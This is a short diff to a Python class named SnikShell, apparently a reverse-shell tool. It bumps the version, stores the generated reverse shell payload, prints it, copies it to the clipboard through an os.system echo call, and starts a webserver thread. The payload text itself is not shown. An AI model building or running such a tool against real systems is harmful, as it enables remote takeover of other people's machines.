@@ -27,9 +27,12 @@ class SnikShell():
             self.ip = requests.get("https://api.ipify.org").text
 
         self.show_banner()
-        print(f"{INFO}: SnikShell v0.1")
+        print(f"{INFO}: SnikShell v0.2")
         print(f"{INFO}: Generating reverse shell payload...")
-        print(f"\n{BOLD}{BLUE}{self.generate_payload()}{END}\n")
+        self.payload = self.generate_payload()
+        print(f"\n{BOLD}{BLUE}{self.payload}{END}\n")
+        print(f"{INFO}: Payload copied to clipboard")
+        os.system(f"echo {self.payload} | clip")
         threading.Thread(target=self.start_webserver).start()
 
     def clear_console(self):
